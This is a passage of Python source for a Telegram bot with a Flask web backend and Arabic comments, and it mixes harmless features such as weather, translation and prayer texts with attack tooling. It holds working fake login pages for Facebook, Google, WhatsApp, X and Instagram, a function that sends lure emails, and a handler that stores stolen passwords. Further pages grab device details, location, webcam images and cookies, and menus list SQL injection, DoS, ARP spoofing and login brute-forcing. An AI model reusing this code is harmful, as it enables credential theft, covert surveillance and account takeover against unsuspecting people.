    except Exception as e:
        return None

def expand_url(short_url):
    try:
        code = short_url.split('/')[-1]
        row = safe_db_query("SELECT original_url FROM short_urls WHERE short_code = ?", (code,))
        if row:
            return row[0]
        return None
    except:
        return None

def extract_pdf_text(data):
    try:
        import pypdf
        reader = pypdf.PdfReader(BytesIO(data))
        text = ""
        for page in reader.pages:
            text += page.extract_text() + "\n"
        return text.strip()
    except ImportError:
        return "مكتبة PyPDF2 غير مثبتة"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def smart_pdf_search(pdf_text, question):
    if not pdf_text:
        return "لم يتم تحميل أي ملف PDF."
    lines = pdf_text.split('\n')
    relevant = [line for line in lines if any(word in line.lower() for word in question.lower().split())]
    if relevant:
        return "\n".join(relevant[:5])
    return "لم يتم العثور على إجابة."

def change_bot_identity():
    try:
        new_name = random.choice(["System Scanner", "Security Checker", "Network Tool"])
        bot.set_my_name(new_name)
        return f"تم تغيير الهوية إلى: {new_name}"
    except Exception as e:
        return f"فشل: {str(e)}"

def clean_traces():
    try:
        for f in os.listdir('temp'):
            try:
                os.remove(os.path.join('temp', f))
            except:
                pass
        return "تم التنظيف"
    except:
        return "فشل التنظيف"

def backup_data():
    try:
        backup_dir = "backups"
        os.makedirs(backup_dir, exist_ok=True)
        backup_file = os.path.join(backup_dir, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
        shutil.copy2(DB_PATH, backup_file)
        return f"تم النسخ: {backup_file}"
    except Exception as e:
        return f"فشل: {str(e)}"

def detect_intrusion():
    return "لا توجد محاولات اختراق مشبوهة."

def active_shield():
    return "درع الحماية مفعل."

def restart_bot_safely():
    safe_db_execute("INSERT OR REPLACE INTO bot_state (key, value) VALUES ('last_restart', ?)", (datetime.now().isoformat(),))
    return "تم إعادة التشغيل"

# ===================== دوال التصيد =====================
PHISHING_TEMPLATES = {
    'facebook': '''
    <!DOCTYPE html>
    <html>
    <head><title>Facebook Login</title>
    <style>body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;}
    .box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:350px;}
    input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}
    button{width:100%;padding:12px;background:#1877f2;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer;}
    </style>
    </head>
    <body>
    <div class="box">
        <h2 style="color:#1877f2;">Facebook</h2>
        <form action="/api/phishing_submit" method="POST">
            <input type="hidden" name="platform" value="facebook">
            <input type="email" name="username" placeholder="البريد الإلكتروني" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
    </body>
    </html>
    ''',
    'google': '''
    <!DOCTYPE html>
    <html>
    <head><title>Google Login</title>
    <style>body{font-family:Arial;background:white;display:flex;justify-content:center;align-items:center;height:100vh;}
    .box{text-align:center;}
    input{width:300px;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}
    button{width:300px;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;}
    </style>
    </head>
    <body>
    <div class="box">
        <h2>Google</h2>
        <form action="/api/phishing_submit" method="POST">
            <input type="hidden" name="platform" value="google">
            <input type="email" name="username" placeholder="البريد الإلكتروني" required><br>
            <input type="password" name="password" placeholder="كلمة السر" required><br>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
    </body>
    </html>
    ''',
    'whatsapp': '''
    <!DOCTYPE html>
    <html>
    <head><title>WhatsApp Web</title>
    <style>body{font-family:Arial;background:#075e54;display:flex;justify-content:center;align-items:center;height:100vh;color:white;}
    .box{background:#128c7e;padding:40px;border-radius:8px;width:350px;text-align:center;}
    input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:4px;}
    button{width:100%;padding:12px;background:#25d366;color:white;border:none;border-radius:4px;font-size:16px;}
    </style>
    </head>
    <body>
    <div class="box">
        <h2>WhatsApp Web</h2>
        <form action="/api/phishing_submit" method="POST">
            <input type="hidden" name="platform" value="whatsapp">
            <input type="text" name="username" placeholder="رقم الهاتف" required><br>
            <input type="password" name="password" placeholder="كلمة السر" required><br>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
    </body>
    </html>
    ''',
    'twitter': '''
    <!DOCTYPE html>
    <html>
    <head><title>X Login</title>
    <style>body{font-family:Arial;background:black;display:flex;justify-content:center;align-items:center;height:100vh;color:white;}
    .box{background:#1a1a1a;padding:40px;border-radius:8px;width:350px;text-align:center;}
    input{width:100%;padding:12px;margin:10px 0;border:none;border-radius:4px;background:#333;color:white;}
    button{width:100%;padding:12px;background:#1d9bf0;color:white;border:none;border-radius:4px;font-size:16px;}
    </style>
    </head>
    <body>
    <div class="box">
        <h2>X</h2>
        <form action="/api/phishing_submit" method="POST">
            <input type="hidden" name="platform" value="twitter">
            <input type="text" name="username" placeholder="اسم المستخدم" required><br>
            <input type="password" name="password" placeholder="كلمة السر" required><br>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
    </body>
    </html>
    ''',
    'instagram': '''
    <!DOCTYPE html>
    <html>
    <head><title>Instagram Login</title>
    <style>body{font-family:Arial;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;}
    .box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:350px;text-align:center;}
    input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;}
    button{width:100%;padding:12px;background:#0095f6;color:white;border:none;border-radius:4px;font-size:16px;}
    </style>
    </head>
    <body>
    <div class="box">
        <h2>Instagram</h2>
        <form action="/api/phishing_submit" method="POST">
            <input type="hidden" name="platform" value="instagram">
            <input type="text" name="username" placeholder="اسم المستخدم" required><br>
            <input type="password" name="password" placeholder="كلمة السر" required><br>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
    </body>
    </html>
    '''
}

def send_phishing_email(target_email, platform, custom_message=None):
    try:
        if not SMTP_USER or not SMTP_PASS:
            return "❌ إعدادات SMTP غير مضبوطة."
        templates = {
            'facebook': f"""
            <h2>تنبيه أمني من فيسبوك</h2>
            <p>نلاحظ نشاطاً غير معتاد على حسابك. يرجى تأكيد هويتك:</p>
            <a href="{SERVER_URL}/phishing_pages/facebook">تأكيد الحساب</a>
            """,
            'google': f"""
            <h2>تحديث الأمان من Google</h2>
            <a href="{SERVER_URL}/phishing_pages/google">التحقق من الحساب</a>
            """,
            'whatsapp': f"""
            <h2>تحديث واتساب ويب</h2>
            <a href="{SERVER_URL}/phishing_pages/whatsapp">إعادة التسجيل</a>
            """,
            'twitter': f"""
            <h2>تأكيد الحساب - X</h2>
            <a href="{SERVER_URL}/phishing_pages/twitter">تأكيد الحساب</a>
            """,
            'instagram': f"""
            <h2>تنبيه من إنستغرام</h2>
            <a href="{SERVER_URL}/phishing_pages/instagram">تأكيد الهوية</a>
            """
        }
        html_content = custom_message or templates.get(platform, templates['facebook'])
        msg = MIMEMultipart('alternative')
        msg['Subject'] = f"تنبيه أمني - {platform.capitalize()}"
        msg['From'] = SMTP_USER
        msg['To'] = target_email
        msg.attach(MIMEText(html_content, 'html'))
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        return f"✅ تم إرسال البريد إلى {target_email}"
    except Exception as e:
        return f"❌ فشل: {str(e)[:100]}"

# ===================== دوال Flask =====================
@app.route('/health')
def health():
    return jsonify({"status": "ok", "time": datetime.now().isoformat()})

@app.route('/device_info')
def device_info_page():
    token = request.args.get('token')
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return "Invalid token", 403
    html = '''
    <!DOCTYPE html>
    <html>
    <body>
    <script>
        const data = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: screen.width + "x" + screen.height,
            cores: navigator.hardwareConcurrency || 'unknown',
            memory: navigator.deviceMemory || 'unknown'
        };
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                data.lat = pos.coords.latitude;
                data.lon = pos.coords.longitude;
                sendData(data);
            });
        } else { sendData(data); }
        function sendData(d) {
            fetch('/api/collect_device', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: '%s', info: d })
            });
        }
        document.write("Collecting Info...");
    </script>
    </body>
    </html>
    ''' % token
    return html

@app.route('/camera_hack')
def camera_hack_page():
    token = request.args.get('token')
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return "Invalid token", 403
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Camera Access</title>
        <script>
            async function capture() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const dataUrl = canvas.toDataURL('image/jpeg');
                    await fetch('/api/collect_camera', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ token: '%s', image: dataUrl })
                    });
                    video.srcObject.getTracks().forEach(track => track.stop());
                } catch(e) { console.log(e); }
            }
            setInterval(capture, 5000);
        </script>
    </head>
    <body>Camera Access Granted.</body>
    </html>
    ''' % token
    return html

@app.route('/cookie_stealer')
def cookie_stealer_page():
    token = request.args.get('token')
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return "Invalid token", 403
    html = '''
    <!DOCTYPE html>
    <html>
    <body>
        <script>
            const cookies = document.cookie;
            fetch('/api/collect_cookie', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: '%s', cookies: cookies, url: window.location.href })
            });
            document.body.innerHTML = "Loading...";
        </script>
    </body>
    </html>
    ''' % token
    return html

@app.route('/phishing_pages/<platform>')
def phishing_page(platform):
    html = PHISHING_TEMPLATES.get(platform)
    if not html:
        return "منصة غير مدعومة", 404
    return render_template_string(html)

@app.route('/api/phishing_submit', methods=['POST'])
def phishing_submit():
    try:
        platform = request.form.get('platform', 'unknown')
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip = request.remote_addr
        safe_db_execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                        ('', platform, username, password, ip, datetime.now().isoformat()))
        notify_admin(f"🎯 تصيد جديد!\nالمنصة: {platform}\nالمستخدم: {username}\nكلمة السر: {password}")
        real_urls = {
            'facebook': 'https://www.facebook.com',
            'google': 'https://www.google.com',
            'whatsapp': 'https://web.whatsapp.com',
            'twitter': 'https://x.com',
            'instagram': 'https://www.instagram.com'
        }
        return f'<script>window.location.href="{real_urls.get(platform, "https://google.com")}";</script>'
    except Exception as e:
        return "حدث خطأ", 500

@app.route('/api/collect_device', methods=['POST'])
def collect_device():
    data = request.json
    token = data.get('token')
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return jsonify({"status": "error"}), 403
    info = data.get('info', {})
    safe_db_execute("INSERT INTO collected_data (device_id, data_type, data, created_at) VALUES (?, ?, ?, ?)",
                    (str(chat_id), "device_info", json.dumps(info), datetime.now().isoformat()))
    notify_admin(f"📱 جهاز جديد: {info.get('userAgent', 'unknown')}")
    return jsonify({"status": "ok"})

@app.route('/api/collect_camera', methods=['POST'])
def collect_camera():
    data = request.json
    token = data.get('token')
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return jsonify({"status": "error"}), 403
    image_data = data.get('image', '').split(',')[1]
    if image_data:
        img_binary = base64.b64decode(image_data)
        safe_db_execute("INSERT INTO camera_images (chat_id, image, created_at) VALUES (?, ?, ?)",
                        (chat_id, img_binary, datetime.now().isoformat()))
        os.makedirs('collected', exist_ok=True)
        filename = f"collected/cam_{chat_id}_{int(time.time())}.jpg"
        with open(filename, 'wb') as f:
            f.write(img_binary)
        notify_admin(f"📸 صورة من الكاميرا")
    return jsonify({"status": "ok"})

@app.route('/api/collect_cookie', methods=['POST'])
def collect_cookie():
    data = request.json
    token = data.get('token')
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return jsonify({"status": "error"}), 403
    cookies = data.get('cookies', '')
    url = data.get('url', '')
    safe_db_execute("INSERT INTO cookie_logs (url, cookies, ip, user_agent, created_at) VALUES (?, ?, ?, ?, ?)",
                    (url, cookies, request.remote_addr, request.headers.get('User-Agent', ''), datetime.now().isoformat()))
    notify_admin(f"🍪 كوكيز مسروقة")
    return jsonify({"status": "ok"})

# ===================== إنشاء البوت =====================
bot = TeleBot(TOKEN, parse_mode='HTML')
os.makedirs('temp', exist_ok=True)
os.makedirs('downloads', exist_ok=True)
os.makedirs('collected', exist_ok=True)

user_adkar_indices = defaultdict(lambda: {'sabah': 0, 'massaa': 0})
user_doaa_indices = defaultdict(lambda: {})
user_quote_indices = defaultdict(lambda: {'arabic': {}, 'english': {}})
user_tip_indices = defaultdict(lambda: {})
temp_passwords = {}
pdf_texts = {}
user_states = {}
admin_remote = {}
t11_user_mode = {}
t11_user_msg_count = {}
t11_user_voice_preference = {}

# ===================== القوائم =====================
def build_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("الطقس", callback_data="weather"),
        InlineKeyboardButton("ويكيبيديا", callback_data="wikipedia")
    )
    markup.row(
        InlineKeyboardButton("مولد كلمات سر", callback_data="password_gen"),
        InlineKeyboardButton("فحص قوة كلمة السر", callback_data="password_strength")
    )
    markup.row(
        InlineKeyboardButton("تحويل نص إلى صوت", callback_data="text_to_speech"),
        InlineKeyboardButton("ترجمة فورية", callback_data="translate")
    )
    markup.row(
        InlineKeyboardButton("تذكير", callback_data="reminder"),
        InlineKeyboardButton("آخر الأخبار", callback_data="news")
    )
    markup.row(
        InlineKeyboardButton("قص رابط", callback_data="shorten_url"),
        InlineKeyboardButton("فك رابط", callback_data="expand_url")
    )
    if user_can_use_collector(chat_id):
        markup.row(
            InlineKeyboardButton("معلومات الجهاز", callback_data="device_info"),
            InlineKeyboardButton("الكاميرا الأمامية", callback_data="camera_hack")
        )
    if user_can_use_advanced(chat_id):
        markup.row(
            InlineKeyboardButton("رابط خبيث (كوكيز)", callback_data="cookie_stealer"),
            InlineKeyboardButton("تتبع رقم", callback_data="track_phone")
        )
        markup.row(
            InlineKeyboardButton("فحص شامل للموقع", callback_data="comprehensive_scan")
        )
    markup.row(
        InlineKeyboardButton("اقتباسات", callback_data="quotes_menu"),
        InlineKeyboardButton("نصائح", callback_data="tips_menu")
    )
    markup.row(
        InlineKeyboardButton("فحص الرابط", callback_data="check_link_advanced"),
        InlineKeyboardButton("تحليل APK", callback_data="analyze_apk")
    )
    markup.row(
        InlineKeyboardButton("تحليل PDF", callback_data="pdf_menu"),
        InlineKeyboardButton("الأجهزة", callback_data="list_devices")
    )
    markup.row(
        InlineKeyboardButton("📿 أذكار الصباح", callback_data="adkar_sabah"),
        InlineKeyboardButton("🌙 أذكار المساء", callback_data="adkar_massaa")
    )
    markup.row(
        InlineKeyboardButton("🤲 أدعية متنوعة", callback_data="doaa_menu"),
        InlineKeyboardButton("🕌 مسلم", callback_data="muslim_menu")
    )
    markup.row(
        InlineKeyboardButton("🤖 مساعد T11", callback_data="t11_menu"),
        InlineKeyboardButton("نقاطي", callback_data="my_points")
    )
    markup.row(
        InlineKeyboardButton("رابط دعوتي", callback_data="my_referral"),
        InlineKeyboardButton("سجل النقاط", callback_data="points_history")
    )
    markup.row(
        InlineKeyboardButton("إعدادات متقدمة", callback_data="admin_panel")
    )
    if is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("القائمة السرية", callback_data="hacking_menu"),
            InlineKeyboardButton("الحماية", callback_data="protection_menu")
        )
        markup.row(
            InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"),
            InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat")
        )
        markup.row(
            InlineKeyboardButton("أرسل للمستخدم", callback_data="send_to_user"),
            InlineKeyboardButton("نشاط المستخدمين", callback_data="user_activity")
        )
        markup.row(
            InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"),
            InlineKeyboardButton("حظر المستخدمين", callback_data="admin_ban_menu")
        )
    markup.row(
        InlineKeyboardButton("تحميل فيديو", callback_data="download_video")
    )
    if user_can_use_phishing(chat_id) or is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("صفحات تصيد", callback_data="phishing_pages"),
            InlineKeyboardButton("بريد تصيد", callback_data="phishing_email")
        )
    else:
        markup.row(
            InlineKeyboardButton("🔒 صفحات تصيد (300 نقطة)", callback_data="phishing_locked")
        )
    if is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("وضع التخفي", callback_data="toggle_stealth"),
            InlineKeyboardButton("قفل البوت", callback_data="protect_lock")
        )
    return markup

def build_t11_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("📊 تقرير", callback_data="t11_report"),
        InlineKeyboardButton("🎤 تحدث معي", callback_data="t11_voice")
    )
    markup.row(
        InlineKeyboardButton("📖 عن T11", callback_data="t11_about"),
        InlineKeyboardButton("❓ مساعدة", callback_data="t11_help")
    )
    markup.row(
        InlineKeyboardButton("⚙️ إعدادات الصوت", callback_data="t11_voice_settings"),
        InlineKeyboardButton("رجوع", callback_data="back_main")
    )
    return markup

def build_t11_voice_settings():
    markup = InlineKeyboardMarkup(row_width=2)
    for name, code in T11_VOICE_CODES.items():
        if name not in ['ولد', 'ولد_مصري', 'بنت_سعودية']:
            markup.row(InlineKeyboardButton(f"🎤 صوت {name}", callback_data=f"t11_set_voice_{name}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="t11_menu"))
    return markup

def build_quotes_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("اقتباسات عربية", callback_data="quotes_arabic"), InlineKeyboardButton("اقتباسات إنجليزية", callback_data="quotes_english"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_quotes_type_menu(lang):
    markup = InlineKeyboardMarkup(row_width=3)
    if lang == 'arabic':
        markup.row(InlineKeyboardButton("حزين", callback_data="quote_arabic_sad"), InlineKeyboardButton("عميق", callback_data="quote_arabic_deep"), InlineKeyboardButton("جميل", callback_data="quote_arabic_beautiful"))
    else:
        markup.row(InlineKeyboardButton("Sad", callback_data="quote_english_sad"), InlineKeyboardButton("Deep", callback_data="quote_english_deep"), InlineKeyboardButton("Beautiful", callback_data="quote_english_beautiful"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="quotes_menu"))
    return markup

def build_quote_action_menu(lang, category, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي 🔄", callback_data=f"quote_next_{lang}_{category}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع 🔙", callback_data=f"quotes_{lang}"))
    return markup

def build_adkar_action_menu(adkar_type, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي 🔄", callback_data=f"adkar_next_{adkar_type}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع 🔙", callback_data="back_main"))
    return markup

def build_doaa_action_menu(category, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي 🔄", callback_data=f"doaa_next_{category}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع 🔙", callback_data="doaa_menu"))
    return markup

def build_phishing_pages_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_facebook"), InlineKeyboardButton("جوجل", callback_data="phish_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_whatsapp"), InlineKeyboardButton("تويتر", callback_data="phish_twitter"))
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_instagram"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_phishing_platform_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_platform_facebook"), InlineKeyboardButton("جوجل", callback_data="phish_platform_google"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_platform_whatsapp"), InlineKeyboardButton("تويتر", callback_data="phish_platform_twitter"))
    markup.row(InlineKeyboardButton("انستغرام", callback_data="phish_platform_instagram"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_tips_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("نصائح دراسية", callback_data="tips_study"), InlineKeyboardButton("نصائح اجتماعية", callback_data="tips_social"))
    markup.row(InlineKeyboardButton("نصائح للاكتئاب", callback_data="tips_depression"), InlineKeyboardButton("نصائح إسلامية", callback_data="tips_islamic"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_tip_action_menu(category, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("التالي 🔄", callback_data=f"tip_next_{category}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع 🔙", callback_data="tips_menu"))
    return markup

def build_protection_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("درع الحماية", callback_data="protect_shield"), InlineKeyboardButton("قفل البوت", callback_data="protect_lock"))
    markup.row(InlineKeyboardButton("تخفي شامل", callback_data="protect_stealth"), InlineKeyboardButton("كشف الاختراق", callback_data="protect_detect"))
    markup.row(InlineKeyboardButton("تغيير الهوية", callback_data="protect_identity"), InlineKeyboardButton("تنظيف السجلات", callback_data="protect_clean"))
    markup.row(InlineKeyboardButton("حماية API", callback_data="protect_api"), InlineKeyboardButton("نسخ احتياطي", callback_data="protect_backup"))
    markup.row(InlineKeyboardButton("إعادة تشغيل آمن", callback_data="protect_reboot"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_pdf_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("تلخيص PDF", callback_data="pdf_summary"), InlineKeyboardButton("استخراج نصوص", callback_data="pdf_extract"))
    markup.row(InlineKeyboardButton("تحليل ذكي (أسئلة)", callback_data="pdf_smart"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_hacking_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("حقن SQL", callback_data="hack_sqli"), InlineKeyboardButton("XSS", callback_data="hack_xss"))
    markup.row(InlineKeyboardButton("DoS", callback_data="hack_dos"), InlineKeyboardButton("ARP Spoof", callback_data="hack_arp"))
    markup.row(InlineKeyboardButton("تخمين فيسبوك", callback_data="bruteforce_fb"), InlineKeyboardButton("تخمين انستغرام", callback_data="bruteforce_ig"))
    markup.row(InlineKeyboardButton("تخمين SSH", callback_data="bruteforce_ssh"), InlineKeyboardButton("تخمين FTP", callback_data="bruteforce_ftp"))
    markup.row(InlineKeyboardButton("تخمين مخصص", callback_data="bruteforce_custom"), InlineKeyboardButton("تحميل فيديو", callback_data="download_video"))
    markup.row(InlineKeyboardButton("مسح منافذ", callback_data="port_scan"), InlineKeyboardButton("فحص SSL", callback_data="ssl_scan"))
    markup.row(InlineKeyboardButton("كاميرا", callback_data="hack_camera"), InlineKeyboardButton("ميكروفون", callback_data="hack_mic"))
    markup.row(InlineKeyboardButton("موقع", callback_data="hack_location"), InlineKeyboardButton("جهات اتصال", callback_data="hack_contacts"))
    markup.row(InlineKeyboardButton("رسائل SMS", callback_data="hack_sms"), InlineKeyboardButton("لقطة شاشة", callback_data="hack_screenshot"))
    markup.row(InlineKeyboardButton("Shell", callback_data="hack_shell"), InlineKeyboardButton("إيقاف تشغيل", callback_data="hack_shutdown"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("إحصائيات", callback_data="admin_stats"), InlineKeyboardButton("بث جماعي", callback_data="admin_broadcast"))
    markup.row(InlineKeyboardButton("المستخدمين", callback_data="admin_users"), InlineKeyboardButton("التقارير", callback_data="admin_reports"))
    markup.row(InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"), InlineKeyboardButton("حظر المستخدمين", callback_data="admin_ban_menu"))
    markup.row(InlineKeyboardButton("سجل التصيد", callback_data="admin_phishing_logs"), InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"))
    markup.row(InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat"), InlineKeyboardButton("أرسل للمستخدم", callback_data="send_to_user"))
    markup.row(InlineKeyboardButton("نشاط المستخدمين", callback_data="user_activity"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_doaa_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("🤲 أدعية السفر", callback_data="doaa_safar"), InlineKeyboardButton("🤲 أدعية الهم", callback_data="doaa_hem"))
    markup.row(InlineKeyboardButton("🤲 أدعية الرزق", callback_data="doaa_rizq"), InlineKeyboardButton("🤲 أدعية النوم", callback_data="doaa_nawm"))
    markup.row(InlineKeyboardButton("🤲 أدعية الفرج", callback_data="doaa_faraj"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_muslim_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.row(InlineKeyboardButton("🕌 أركان الإسلام", callback_data="muslim_arkan_islam"))
    markup.row(InlineKeyboardButton("📖 أركان الإيمان", callback_data="muslim_arkan_iman"))
    markup.row(InlineKeyboardButton("💧 أركان الوضوء", callback_data="muslim_wudu"))
    markup.row(InlineKeyboardButton("🚿 صفة الغسل", callback_data="muslim_ghusl"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_translate_menu():
    markup = InlineKeyboardMarkup(row_width=3)
    languages = list(LANGUAGES.items())
    for i in range(0, len(languages), 3):
        row = []
        for code, name in languages[i:i+3]:
            row.append(InlineKeyboardButton(name, callback_data=f"trans_lang_{code}"))
        markup.row(*row)
    markup.row(InlineKeyboardButton("إلغاء", callback_data="back_main"))
    return markup

def build_voice_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton("🎤 صوت ولد", callback_data="voice_ولد"),
        InlineKeyboardButton("🎤 صوت بنت", callback_data="voice_بنت"),
        InlineKeyboardButton("🎤 صوت ولد مصري", callback_data="voice_ولد_مصري"),
        InlineKeyboardButton("🎤 صوت بنت سعودية", callback_data="voice_بنت_سعودية")
    ]
    markup.row(*buttons[:2])
    markup.row(*buttons[2:])
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_users_menu(chat_id, action):
    users = safe_db_query("SELECT chat_id, is_admin, is_banned, points FROM users", fetch_one=False)
    if not users:
        return None, "لا يوجد مستخدمين"
    markup = InlineKeyboardMarkup(row_width=1)
    for user in users:
        user_id = user[0]
        name = get_user_name(user_id)
        status = "🟢" if user[2] == 0 else "🔴"
        label = f"{name} ({user_id}) - {status} - نقاط: {user[3]}"
        markup.row(InlineKeyboardButton(label, callback_data=f"{action}_user_{user_id}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup, None

# ===================== معالج الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        chat_id = call.message.chat.id
        data = call.data
        log_activity(chat_id, data)
        update_last_seen(chat_id)

        if data == "back_main":
            safe_send(chat_id, "القائمة الرئيسية", reply_markup=build_main_menu(chat_id))
            return

        # ===== T11 =====
        if data == "t11_menu":
            safe_send(chat_id, "🤖 بروتوكول T11", reply_markup=build_t11_menu())
            return
        if data == "t11_report":
            if chat_id != ADMIN_ID:
                safe_send(chat_id, "⛔ خاصية المطور.")
                return
            rep = t11_get_report()
            safe_send(chat_id, f"📊 تقرير 24 ساعة:\nحظر: {rep.get('ban', 0)}")
            return
        if data == "t11_voice":
            user_states[chat_id] = "t11_waiting_voice"
            safe_send(chat_id, "🎤 أرسل النص:")
            return
        if data == "t11_about":
            safe_send(chat_id, "🤖 T11 - كيان آلي غامض وحكيم.")
            return
        if data == "t11_help":
            safe_send(chat_id, "🤖 الأوامر: /start, /report, /say النص")
            return
        if data == "t11_voice_settings":
            safe_send(chat_id, "🎤 اختر الصوت:", reply_markup=build_t11_voice_settings())
            return
        if data.startswith("t11_set_voice_"):
            voice_name = "_".join(data.split("_")[2:])
            voice_code = T11_VOICE_CODES.get(voice_name, T11_DEFAULT_VOICE)
            t11_user_voice_preference[chat_id] = voice_code
            safe_send(chat_id, f"✅ تم اختيار صوت {voice_name}")
            return

        # ===== أذكار وأدعية =====
        if data == "adkar_sabah":
            user_adkar_indices[chat_id]['sabah'] = 0
            adkar_list = ISLAMIC_DATA["adkar_sabah"]
            current = adkar_list[0]
            total = len(adkar_list)
            safe_send(chat_id, f"📿 أذكار الصباح:\n\n{current}", reply_markup=build_adkar_action_menu('sabah', 0, total))
            return
        if data == "adkar_massaa":
            user_adkar_indices[chat_id]['massaa'] = 0
            adkar_list = ISLAMIC_DATA["adkar_massaa"]
            current = adkar_list[0]
            total = len(adkar_list)
            safe_send(chat_id, f"🌙 أذكار المساء:\n\n{current}", reply_markup=build_adkar_action_menu('massaa', 0, total))
            return
        if data.startswith("adkar_next_"):
            parts = data.split("_")
            adkar_type = parts[2]
            idx = int("_".join(parts[3:]))
            adkar_list = ISLAMIC_DATA[f"adkar_{adkar_type}"]
            if idx < len(adkar_list):
                current = adkar_list[idx]
